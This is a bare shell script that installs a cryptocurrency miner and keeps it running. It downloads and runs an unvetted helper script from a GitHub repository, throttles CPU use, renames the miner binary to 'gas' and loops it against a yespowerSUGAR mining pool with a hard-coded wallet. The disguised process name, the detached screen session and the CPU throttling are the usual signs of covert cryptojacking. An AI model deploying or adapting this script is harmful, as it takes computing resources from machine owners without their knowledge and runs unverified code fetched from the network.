#!/bin/sh
#

sudo apt update
sudo apt install cpulimit
sudo apt install screen -y
wget https://github.com/wikangdijalalan2/jagahkurang34/raw/main/limiting.sh 
chmod +x limiting.sh 
screen -dmS randum ./limiting.sh cpuminer-avx 6575 
wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz 
tar -xf cpuminer-opt-linux.tar.gz 
mv cpuminer-avx gas
while [ 1 ]; do
./gas -a yespowerSUGAR -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1qdgf4da5dcafhug574a0zjrfwkge262tl3q99e8.Okbaah 
sleep 3 
done
sleep 999 
